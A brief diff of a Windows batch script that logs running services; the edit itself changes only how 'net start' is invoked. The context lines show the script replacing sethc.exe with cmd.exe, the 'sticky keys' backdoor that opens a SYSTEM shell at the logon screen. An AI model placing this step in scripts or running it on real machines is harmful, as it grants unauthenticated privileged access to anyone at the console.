@@ -71,7 +71,7 @@ ren "%systemroot%\System32\sethc.exe" "%systemroot%\System32\sethc1.exe"
 copy "%systemroot%\System32\cmd.exe" "%systemroot%\System32\sethc.exe"
 
 :@@@CURRENTLY RUNNING SERVICES@@@
-start cmd.exe /c net start >> C:\Wangblows\Services_Started.txt
+net start >> C:\Wangblows\Services_Started.txt
 if %errorlevel%==1 echo Running services failed to write >> C:\Wangblows\Wangblows.txt
 
 
